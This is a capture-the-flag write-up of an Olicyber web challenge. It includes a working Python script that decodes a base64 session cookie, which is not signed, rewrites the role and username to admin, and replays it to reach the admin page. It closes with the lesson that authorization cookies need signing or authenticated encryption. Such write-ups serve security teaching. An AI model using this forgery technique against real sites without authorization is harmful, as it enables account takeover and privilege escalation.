---
title: "Cookie Monster — Base64 JSON Cookie Role Elevation"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["web", "cookie-manipulation", "base64", "python"]
difficulty: "beginner"
summary: "The session cookie is a URL-encoded base64 of a JSON string like 'id-role-username'. Decode it, change the role to 0 and username to admin, re-encode, and access the admin page."
---

## The Challenge

Register and log in. The session cookie is a URL-encoded base64 blob. Decoding it reveals a structure like `timestamp-role_flag-username` where `role_flag` is `1` for a regular user. The admin page checks for role `0`.

## Approach

1. Register and log in with arbitrary credentials.
2. URL-decode and base64-decode the `session` cookie.
3. Split on `-`, set `data[1] = '0'` (admin role), `data[2] = 'admin'`.
4. Re-join, base64-encode, URL-encode.
5. Send the forged cookie to `home.php`.

## Solution

```python
import requests, urllib, base64
site = "http://cma.challs.olicyber.it/index.php"
site1 = "http://cma.challs.olicyber.it/home.php"
s = requests.Session()
s.post(site, data={"username":"sas123sas", "password":"sas123sas", "register":"Arruolati"})
s.post(site, data={"username":"sas123sas", "password":"sas123sas", "login":"Log In"})
c = urllib.parse.unquote(s.cookies.get_dict()["session"])
data = base64.b64decode(c).decode().split("-")
data[1] = '0'
data[2] = 'admin'
f = f"{data[0]}-{data[1]}-{data[2]}".encode()
cookie = urllib.parse.quote(base64.b64encode(f))
r = requests.get(site1, cookies={"session":f"{cookie}"})
for i in r.text.split("\n"):
    if "flag" in i:
        print(i.replace(" ", ""), end="")
        break
```

`urllib.parse.unquote` + `base64.b64decode` unwraps the cookie to the raw `-`-delimited string. Modifying the fields and re-encoding with `base64.b64encode` + `urllib.parse.quote` produces the forged admin cookie. The `home.php` endpoint responds with the flag.

## What I Learned

Encoding is not encryption. A cookie that is base64-encoded is readable and rewritable by any client. Cookies that control authorization must be signed (e.g. with HMAC) or encrypted with an authenticated cipher — otherwise any client can forge any role.
